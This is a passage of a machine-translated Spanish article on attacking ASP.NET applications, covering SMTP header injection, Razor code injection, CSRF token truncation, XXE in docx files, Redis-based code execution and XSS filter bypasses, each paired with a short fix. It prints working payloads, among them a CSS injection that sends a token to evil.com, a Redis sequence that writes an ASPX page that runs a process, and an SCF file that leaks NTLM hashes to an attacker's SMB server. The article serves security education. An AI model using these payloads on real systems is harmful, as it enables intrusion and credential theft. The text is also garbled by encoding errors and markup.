FormsAuthentication.Authenticate(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">password</span></span>)) { FormsAuthentication.SetAuthCookie(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); Response.Redirect(Request[‚ÄúReturnUrl‚Äù] ?? ‚Äú/‚Äù); } <span class="hljs-keyword"><span class="hljs-keyword">Else</span></span> { ModelState.AddModeError(‚Äúfail‚Äù, ‚Äú   .‚Äù + ‚Äú   ‚Äù); } }</code> </pre><br>  <b>Prueba de concepto</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/DlkYQrkTiEs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>Soluci√≥n:</b> este error se corrigi√≥ en .Net 3.5 <br><br>  <b>Depuraci√≥n remota</b> <br><br>  <b>Descripci√≥n:</b> dado que ASP.NET es una aplicaci√≥n compilada, tiene ciertas caracter√≠sticas de depuraci√≥n.  Microsoft le permite usar un depurador remoto para trabajar en la versi√≥n de depuraci√≥n de la aplicaci√≥n. <br><br>  Si este puerto est√° abierto en Internet y est√° protegido por una contrase√±a simple o no hay ninguna contrase√±a, entonces es posible recoger un depurador.  Adem√°s, esto le permitir√° influir en la aplicaci√≥n en modo DEPURAR.  Incluyendo extraer contrase√±as, cambiar la l√≥gica, realizar el seguimiento, etc. <br><br>  <b>Prueba de concepto</b> : <br><br><img src="https://habrastorage.org/webt/pl/f3/ba/plf3ba206usqwa10gt59go39w8k.png"><br><br>  <b>Soluci√≥n:</b> use una contrase√±a segura y no exponga el servicio para la depuraci√≥n. <br><br>  <b>Inyecci√≥n de encabezado SMTP</b> <br><br>  <b>Descripci√≥n:</b> debe recordar una peque√±a especificaci√≥n del protocolo SMTP. <br>  Un ejemplo de c√≥mo se ve un paquete de mensaje simple SMTP normal: <br><br><pre> <code class="hljs powershell">Received: from mail.bieberdorf.edu (mail.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.78</span></span>]) by mailhost.immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>/<span class="hljs-number"><span class="hljs-number">8.7</span></span>.<span class="hljs-number"><span class="hljs-number">2</span></span>) with ESMTP id LAA20869 <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ; Tue, <span class="hljs-number"><span class="hljs-number">18</span></span> Mar <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">24</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) Received: from alpha.bieberdorf.edu (alpha.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.11</span></span>]) by mail.bieberdorf.edu (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>) id <span class="hljs-number"><span class="hljs-number">004</span></span>A21; Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) From: rth@bieberdorf.edu (RT Hood) To: tmh@immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com Date: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message<span class="hljs-literal"><span class="hljs-literal">-Id</span></span>: &lt;rth031897143614<span class="hljs-literal"><span class="hljs-literal">-00000298</span></span>@mail.bieberdorf.edu&gt; X<span class="hljs-literal"><span class="hljs-literal">-Mailer</span></span>: Loris v2.<span class="hljs-number"><span class="hljs-number">32</span></span>  Lunch today?</code> </pre><br>  Obviamente, en ausencia de validaci√≥n del valor que cae en el encabezado "Para", es posible redirigir la carta a otro destinatario.  Pero eso ser√≠a demasiado simple y obvio, por lo que la validaci√≥n ya est√° sucediendo en el nivel .Net. <br><br>  Sin embargo, si introduce un nuevo encabezado Reply-To, una direcci√≥n para respuestas, muchas formas como "Contrase√±a olvidada" a menudo toman la direcci√≥n de env√≠o, por lo tanto, es suficiente para introducir caracteres de retorno de carro y avance de l√≠nea y obtener una carga de trabajo. <br><br><pre> <code class="hljs julia">... From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com/r/nReply-to:hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt; ...      : From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com Reply-To: hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt;</code> </pre><br>  <b><u>Ejemplo de c√≥digo vulnerable:</u></b> <br><br><pre> <code class="hljs python">MailAddress <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> = new MailAddress(‚Äú******@mail.r<span class="hljs-string"><span class="hljs-string">u", ‚Äútest"</span></span>); MailAddress to = new MailAddress(email); MailMessage m = new MailMessage(<span class="hljs-keyword"><span class="hljs-keyword">from</span></span>, to); m.Subject = <span class="hljs-string"><span class="hljs-string">""</span></span>; m.Body = <span class="hljs-string"><span class="hljs-string">"-"</span></span>; m.Headers.Add(‚ÄúTo<span class="hljs-string"><span class="hljs-string">", email); m.IsBodyHtml = true; SmtpClient smtp = new SmtpClient("</span></span>smtp.mail.r<span class="hljs-string"><span class="hljs-string">u", 587); smtp.Credentials = new NetworkCredential(‚Äú******@mail.ru"</span></span>, ‚Äú******<span class="hljs-string"><span class="hljs-string">"); smtp.EnableSsl = true; smtp.Send(m);</span></span></code> </pre><br>  <b>Prueba de concepto</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/Bs_4_hpomig" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>Soluci√≥n:</b> no escriba c√≥digo complejo, use .Net nuevo <br><br>  <b>RCE en vista parcial</b> <br><br>  <b>Descripci√≥n:</b> Hay dos conceptos importantes en la terminolog√≠a ASP.NET MVC: <br>  <b>Ver</b> es la vista que ve el usuario.  Como ya se se√±al√≥, gracias a los motores de formularios web o de afeitar, es posible implementar c√≥digo del lado del servidor. <br>  <b>Vista parcial</b> - <b>Vista parcial</b> .  Esto forma parte del contenido de la Vista, extra√≠do en un archivo separado para mayor comodidad. <br><br>  Es necesario tener alg√∫n campo en la Vista parcial, que se representa en html y en el que es posible ingresar una carga peligrosa. <br><br>  <b>Ejemplo de carga:</b> obtener la contrase√±a del usuario actual <br><br><pre> <code class="hljs css">@((<span class="hljs-keyword"><span class="hljs-keyword">Account</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">Models</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>)<span class="hljs-keyword"><span class="hljs-keyword">Session</span></span>[‚Äú<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>‚Äù].<span class="hljs-keyword"><span class="hljs-keyword">Password</span></span></code> </pre> <br>  Como resultado de ingresar a la Vista, este c√≥digo se ejecutar√°.  Dado que las directivas ser√°n reconocidas como un motor de afeitar.  La siguiente figura muestra c√≥mo sucede esto. <br><br>  <b>Algoritmo</b> <br><br><ol><li>  El usuario hace una solicitud al controlador; </li><li>  El controlador representa la vista; </li><li>  Dentro de la Vista, se encuentra una Vista parcial, despu√©s de lo cual se realiza nuevamente una solicitud al controlador, que es responsable de representar la vista parcial; </li><li>  La Vista parcial finalizada se devuelve a la primaria y la primaria al usuario. </li></ol><br><img src="https://habrastorage.org/webt/_j/si/qs/_jsiqsyffaujvq2hikalumgdxte.png"><br><br>  <b>Prueba de concepto</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>Un ejemplo simplificado</b> : <br><br><pre> <code class="hljs pgsql">@{ Html.RenderPartial("Code", html); } Controller - <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> ActionResult <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span>(string html = "") { ViewBag.Html = html; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">View</span></span>(); } Partial <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> ‚Äì   @model string @{ Layout = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; } @Model <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span> <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> ‚Äì   @{ string html = ViewBag.Html.ToString(); } @{ Html.RenderPartial("Code", html); }</code> </pre><br>  <b>Prueba de concepto</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>PD:</b> intentar reproducir no tiene √©xito. <br><br>  <b>Inyecci√≥n CSRF y CSS</b> <br><br>  Estas vulnerabilidades implican interacci√≥n con el usuario. <br><br>  <b>CSRF (</b> falsificaci√≥n de solicitud de sitio cruzado <b>)</b> : falsificaci√≥n de solicitud de sitio cruzado. <br><br>  <b>Algoritmo</b> <br><br><ol><li>  El usuario llega al sitio del hacker; </li><li>  Rellena los campos del formulario; </li><li>  Los datos del formulario se env√≠an a otro sitio en nombre del usuario y con su funci√≥n; </li><li>  Por lo tanto, el usuario, sin darse cuenta, realiz√≥ algunas acciones en otro recurso. </li></ol><br>  Para protegerse contra este tipo de ataque, se inventaron tokens CSRF, como regla, esta es una cadena que contiene una secuencia de caracteres. <br><br>  Se encontr√≥ una vulnerabilidad que elud√≠a la protecci√≥n contra CSRF.  Solo era necesario usar una cadena mucho menos que el original como token. <br><br>  <b>Ficha regular</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj" /&gt;</code> </pre> <br>  <b>Token vulnerable</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="ovomyQnYPxvPXfdxrjO1JEce3zPvGn" /&gt;</code> </pre> <br>  <b>La carga para robar el token a trav√©s de CSS (no XSS):</b> <br>  En el caso de que truncar el token no ayude, puede recurrir al ataque de inyecci√≥n CSS, que le permite robar el token de la p√°gina y dibujarlo en su recurso.  Gracias a esto, se entrega un token real al usuario, y la solicitud necesaria en el sitio se realiza en su nombre. <br><br>  <b><u>Cargar ejemplo</u></b> : <br><br><pre> <code class="hljs xml">%0A{}*{color:red;} - Test <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"s"</span></span></span><span class="hljs-tag">&gt;</span></span> secret <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/css"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="css"><span class="css"> </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">div</span></span></span><span class="css"> </span><span class="hljs-selector-id"><span class="css"><span class="hljs-selector-id">#s</span></span></span><span class="css">:: </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">-webkit-scrollbar-track-piece</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:vertical</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:increment</span></span></span><span class="css"> { </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">background</span></span></span><span class="css">: red </span><span class="hljs-built_in"><span class="css"><span class="hljs-built_in">url</span></span></span><span class="css">(//evil.com?s); } * {</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link</span></span></span><span class="css">:</span><span class="hljs-string"><span class="css"><span class="hljs-string">'javascript:alert(1)'</span></span></span><span class="css">;</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link-source</span></span></span><span class="css">: current;}</span></span></code> </pre><br>  <b>XXE en DocX</b> <br><br>  <b>Descripci√≥n:</b> ASP.NET, como otras tecnolog√≠as, utiliza muchas soluciones de terceros.  En una de estas soluciones que se integran en ASP.NET, se encontr√≥ la vulnerabilidad XXE (Entidades externas XML), que consiste en un error de analizador xml y la capacidad de conectar entidades externas que pueden contener datos cr√≠ticos.  Lea m√°s sobre XXE en las p√°ginas de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">OWASP</a> . <br><br>  En este caso, el componente es responsable de cargar y analizar archivos docx (Microsoft World).  Dado que cualquier documento de Office es en realidad un conjunto de archivos xml, el an√°lisis puede provocar un ataque XXE. <br><br>  <b>Algoritmo</b> <br><br><ol><li>  Documento de oficina desempaquetado; </li><li>  La carga se est√° introduciendo; </li><li>  Se embala de nuevo como docx; </li><li>  Se vierte en el servidor para su procesamiento, donde se utiliza un componente vulnerable. </li></ol><br>  <b>Prueba de concepto</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/gCAU9M_E2xw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>RCE v√≠a Redis</b> <br><br>  <b>Descripci√≥n:</b> adem√°s de los componentes vulnerables, el pirateo de ASP.NET se puede combinar con tecnolog√≠as vulnerables.  Por ejemplo, se conoce una vulnerabilidad de larga data en el sistema de almacenamiento RAM de Redis que permite que se ejecute c√≥digo arbitrario en el lado del servidor.  A continuaci√≥n, este ataque se considerar√° en relaci√≥n con ASP. <br><br>  <b>Algoritmo</b> <br><br><ol><li>  Conexi√≥n a Redis.  Es importante que se ejecute en el mismo servidor que el servidor web; </li><li>  Realizando la siguiente lista y utilizando un servidor web para ver la p√°gina resultante, se ejecutar√° un c√≥digo arbitrario.  En este caso, llamando a la calculadora: </li></ol><br><pre> <code class="hljs swift">config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dir <span class="hljs-type"><span class="hljs-type">DIRNAME</span></span> config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dbfilename asd.aspx flushall <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span> '&lt;%@ <span class="hljs-type"><span class="hljs-type">Page</span></span> <span class="hljs-type"><span class="hljs-type">Language</span></span>=<span class="hljs-string"><span class="hljs-string">"C#"</span></span> <span class="hljs-type"><span class="hljs-type">AutoEventWireup</span></span>=<span class="hljs-string"><span class="hljs-string">"true"</span></span> <span class="hljs-type"><span class="hljs-type">CodeBehind</span></span>=<span class="hljs-string"><span class="hljs-string">"asd.aspx.cs"</span></span> %&gt;&lt;% <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Diagnostics</span></span>.<span class="hljs-type"><span class="hljs-type">Process</span></span>.<span class="hljs-type"><span class="hljs-type">Start</span></span>(<span class="hljs-string"><span class="hljs-string">"calc.exe"</span></span>); %&gt;' save</code> </pre><br>  <b>Prueba de concepto</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/4p9UlWt9GMY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>Filtro Bypass XSS</b> <br><br>  ASP.NET tiene su propio mecanismo para filtrar datos de ataques de la clase XSS.  Cuando intenta transferir caracteres o firmas prohibidas, se activa la siguiente protecci√≥n: <br><br><img src="https://habrastorage.org/webt/og/-b/me/og-bmepcexanckl1pma1l8_71q4.png"><br><br>  Sin embargo, hay muchas formas de evitar esta protecci√≥n.  Aqu√≠ hay algunos de ellos: <br><br><ul><li>  % EF% BC% 9Cimg% 20src% 3Dxxx% 20onerror% <b>Alerta</b> 3D <b>(1)</b> % EF% BC% 9E </li><li>  &lt;- / script&gt; <b>alerta (1)</b> ; </li><li>  &lt;/ XSS / * - * / STYLE = xss: e / ** / xpression ( <b>alert ('XSS')</b> )&gt; </li><li>  % uff1cscript% uff1e <b>alerta ('XSS')</b> ;% uff1c / script% uff1e </li></ul><br>  En las √∫ltimas versiones, estos m√©todos ya no funcionan, sin embargo, como ya se mencion√≥, la tecnolog√≠a ASP.NET se cre√≥ principalmente para proyectos grandes y largos, por lo que muchos recursos pueden verse afectados por esta vulnerabilidad. <br><br>  <b>Archivo de comandos de Shell</b> <br><br>  <b>Descripci√≥n:</b> no hace mucho tiempo, una vulnerabilidad relacionada con el navegador Google Chrome tron√≥, cuya esencia es robar el hash NTLM del usuario. <br><br>  <b>Algoritmo</b> <br><br>  1) Se prepara un archivo con la extensi√≥n scf y los siguientes contenidos <br><br><pre> <code class="hljs markdown">[Shell] IconFile=\\<span class="hljs-strong"><span class="hljs-strong">***.**</span></span>.<span class="hljs-emphasis"><span class="hljs-emphasis">*.*</span></span>**\icon</code> </pre><br>  donde en lugar de asteriscos ip es la direcci√≥n del servidor smb del atacante; <br><br>  2) Cuando llega a la computadora del usuario, este archivo ni siquiera requiere abrirse.  Es suficiente que el usuario simplemente vaya a la misma carpeta donde se encuentra este archivo.  Tan pronto como esto suceda, se enviar√° un paquete hash al servidor SMB; <br><br>  3) Por lo tanto, el pirateo de infraestructura tambi√©n se puede combinar con vulnerabilidades simples como Open Redirect. <br><br>  <b>Prueba de concepto</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/_iTsFZvvXgg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br><div class="spoiler">  <b class="spoiler_title">Referencias</b> <div class="spoiler_text">  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">metanit.com/sharp/mvc5/12.1.php</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">vimeo.com/35002943</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">mybasictricks.blogspot.ru/2013/10/bypassing-xss-filters.html</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">xakep.ru/2017/05/17/chrome-and-scf-files</a> <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">michaeldaw.org/news/news-030407</a> <br>  ‚Ä¢ codeby.net (SooLFaa) <br>  ‚Ä¢ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">antichat.ru</a> (SooLFaa) </div></div><br>  <b>Gracias por su atencion!</b>  Comparta su experiencia y deje preguntas a Alexei Morozov (tambi√©n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">conocido</a> como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SoolFaa</a> ) en los comentarios a este art√≠culo. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es413649/">https://habr.com/ru/post/es413649/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es413637/index.html">Google public√≥ 7 principios de √©tica de IA</a></li>
<li><a href="../es413639/index.html">Tel√©fonos inteligentes protegidos: ¬øqui√©n lo necesita y en qu√© se diferencian entre s√≠?</a></li>
<li><a href="../es413641/index.html">La controversia del pensamiento de dise√±o.</a></li>
<li><a href="../es413643/index.html">Aitracking: el mejor detector de mentiras</a></li>
<li><a href="../es413647/index.html">Descubre qui√©n eres en el mundo del aprendizaje autom√°tico</a></li>
<li><a href="../es413651/index.html">Juego de computadora: protecci√≥n de los derechos de propiedad intelectual de los desarrolladores</a></li>
<li><a href="../es413653/index.html">Programaci√≥n Probabil√≠stica y el M√©todo Bayesiano para Hackers</a></li>
<li><a href="../es413655/index.html">¬øQu√© textos para las p√°ginas de destino realmente venden?</a></li>
<li><a href="../es413657/index.html">La red neuronal de Uber reconoce a los usuarios en un estado "inusual"</a></li>
<li><a href="../es413661/index.html">Saga de servicios electr√≥nicos y sus ubicaciones. Parte 1. Servicio electr√≥nico</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>